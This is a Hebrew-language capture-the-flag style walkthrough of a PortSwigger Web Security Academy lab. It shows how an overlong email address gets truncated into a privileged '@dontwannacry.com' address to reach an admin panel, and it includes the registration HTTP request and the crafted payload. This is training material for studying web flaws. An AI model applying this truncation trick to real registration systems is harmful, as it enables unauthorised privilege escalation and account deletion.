הסימולציה שאני עושה נמצאת באתר portswigger, שנקרא: Lab: Inconsistent handling of exceptional input

הערה מוקדמת:
```
החדר הזה אינו מאמת כראוי את הקלט
של המשתמש. ניתן לנצל את זה בתהליך רישום
החשבון כדי לקבל גישה לפונקציות ניהוליות

כדי לפתור את החדר, עליך לגשת ללוח הניהול
ולמחוק את המשתמש: 'carlos'
```

### הפתרון המלא:
<img width="1557" height="666" alt="Pasted image 20260405144146" src="https://github.com/user-attachments/assets/3394c5b8-c653-4f5e-8821-8ad965aa49bd" />

בהתחלה אנחנו רואים שלא סיפקו לנו משתמש וסיסמא לטסט, אז עליינו ליצור אחד חדש מה- `register`.
לאחר שנכנסנו לדף ההרשמה אנחנו רואים שיש שם כיתוב מעל השדה הרשמה שכתוב: `If you work for DontWannaCry, please use your @dontwannacry.com email address` 

<img width="1274" height="590" alt="Pasted image 20260405144404" src="https://github.com/user-attachments/assets/e9d89834-3c5e-42d4-b72a-488ecb7ca41f" />

וזה סימן שאולי הפגם קשור לזה שאם אתה נכנס עם מייל של עובד אתה מקבל גישה ללוח אדמין: `admin panel` הבעיה היא שהמערכת מאמתת מיילים ואין לי גישה למייל של עובד,

ואז עלה לי רעיון, מה אם אני הוכל ליצור מייל ארוך כל כך כדי שהמשתמש יקרא רק את כמות התווים המקסימלית למייל הזה ולנצל את זה לטובתי כדי לקבל הרשאות מנהל?

איך זה נעשה:
קודם כל עליי לבדוק מה המקסימום תווים שהמערכת יכולה לקרוא
אז סתם חירבשתי משהו עם הסיומת של המייל שלי:

<img width="1245" height="244" alt="Pasted image 20260405145348" src="https://github.com/user-attachments/assets/475d01a8-f8b8-4e32-8617-8638998c3e43" />

הסיומת מייל: 
```
@exploit-0a170040031668a68077259a0146008c.exploit-server.net
```
בקשה להרשמה:

``` HTTP
POST /register HTTP/2
Host: 0a860027033e683780a726b600c20060.web-security-academy.net
Cookie: session=4eCLAC8Q1DEaZsAMYWLZhDQImAZoItGv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Origin: https://0a860027033e683780a726b600c20060.web-security-academy.net
Referer: https://0a860027033e683780a726b600c20060.web-security-academy.net/register
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=8KukC0AOzFUe8M2cbzk1yBcBOUsZG6Sg&username=ziv&email=attacker@exploit-0a170040031668a68077259a0146008c.exploit-server.net&password=ziv
```

לקחתי תווי מספרים רנדומלים וקלטתי לתוך המשתנה `email`:

``` 
192131231231213213123123123124124234151345314545153415143513541435145314354135135413454351345143513513451345134563346436436431636113641461614614343212351234234124213431434124213412341234123423143124231424132434143312413241`2324124132412342134123434234324234@exploit-0a170040031668a68077259a0146008c.exploit-server.net
```

כל מה שנותר לעשות זה לראות שזה באמת עבד ועבר את הבדיקה של המערכת על ידי התחברות למשתמש חדש.

<img width="1171" height="536" alt="Pasted image 20260405150905" src="https://github.com/user-attachments/assets/0b5724de-9e6f-4480-9e55-e9ba7986fa84" />

אחרי שניסינו אנחנו רואים שתי דברים מאוד קריטים לניצול ולפריצה
דבר ראשון: האימות משתמש דרך המייל עבד!
למרות שהמערכת קוראת את המייל לפי הגבלה של מספר תווים עדיין אפשר לאמת את החשבון
דבר שני: כפי שכבר ציפינו שיקרה המערכת הראתה לנו את מספר התווים שהמערכת קוראת והצלחנו לראות את המקסימום:

<img width="1349" height="459" alt="Pasted image 20260405151218" src="https://github.com/user-attachments/assets/23ee73dc-4695-4547-bf42-5134668cecbf" />

עכשיו כל מה שנשאר לנו לעשות זה להסתיר בתוך המייל הארוך הזה את הכתובת עובד ואז נראה אם אנחנו מקבלים גישה ל- `admin panel` ומאמתים אותה דרך כתובת הפורץ.

הכתובת הזדונית:
```
2131312312312132131231231231241242341513453145451534151435135414351453143541351354134543513451435135134513451345633464364364316361136414616146143432123512342341242134314341242134123412341234231431242314241324341433124132411112324124132412@dontwannacry.com.exploit-0a170040031668a68077259a0146008c.exploit-server.net
```

<img width="1227" height="437" alt="Pasted image 20260405154213" src="https://github.com/user-attachments/assets/b04dd33a-570e-4e07-bb7a-9089fe6ae829" />

בום! יש לנו את זה, עכשיו מה שנותר לנו לעשות זה להיכנס ללוח האדמין ולמחוק את המשתמש של `carlos`:

<img width="1557" height="713" alt="Pasted image 20260405154311" src="https://github.com/user-attachments/assets/fd0d080c-a127-46a7-8876-4aaa4e2a56a3" />

סיימנו את החדר הזה.


